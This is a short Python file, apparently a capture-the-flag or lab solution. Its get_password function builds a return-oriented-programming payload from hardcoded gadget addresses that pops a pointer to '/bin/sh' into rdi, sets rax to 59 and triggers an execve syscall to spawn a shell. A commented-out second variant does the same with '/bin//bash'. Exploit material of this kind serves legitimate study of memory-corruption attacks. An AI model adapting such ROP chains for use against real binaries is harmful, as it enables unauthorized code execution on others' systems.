from struct import pack

def get_id(addr1, addr2):
    return '16'


def get_password(addr1, addr2):
    p = bytes()

    p += pack('<Q', 0x0000000000000000) #dummy data
    p += pack('<Q', 0x0000000000401643)  # pop rdi ; ret
    p += pack('<Q', 0x0000000000402004)  # pointer to '/bin/sh'

    p += pack('<Q', 0x0000000000401270)  # xor rax, rax ; ret
    p += pack('<Q', 0x00000000004012b0)  # add rax, 59 ; ret
    # xor rsi, rsi ; xor rdx, rdx ; syscall
    p += pack('<Q', 0x0000000000401346)

    return p
'''

def get_id(addr1, addr2):
    return '16'

def get_password(addr1, addr2):
    p = bytes()

    #p += pack('<Q', 0x0000000000000000)
    p += pack('<Q', 0x0000000000402004)  # pointer to '/bin//bash'
    p += pack('<Q', 0x0000000000401623)  # pop rdi ; ret
    p += pack('<Q', 0x0000000000402004)  # pointer to '/bin//bash'
    #p += pack('<Q', 0x0000000000000000) # dummy data


    p += pack('<Q', 0x00000000004015d8) # pop rsi ; ret
    #p += pack('<Q', 0x0000000000000000) # 0 (NULL은 0으로 정의된다)
    p += pack('<Q', 0x00000000004012e8) # pop rdx ; ret
    #p += pack('<Q', 0x0000000000000000) # 0 (NULL은 0으로 정의된다)

    p += pack('<Q', 0x0000000000401270)  # xor rax, rax ; ret
    p += pack('<Q', 0x00000000004012b1)  # add rax, 59 ; ret
    
    # p += pack('<Q', 0x00000000004012c1) # add eax, 1 ; ret
    # xor rsi, rsi ; xor rdx, rdx ; syscall
    p += pack('<Q', 0x0000000000401346)

    return p
'''
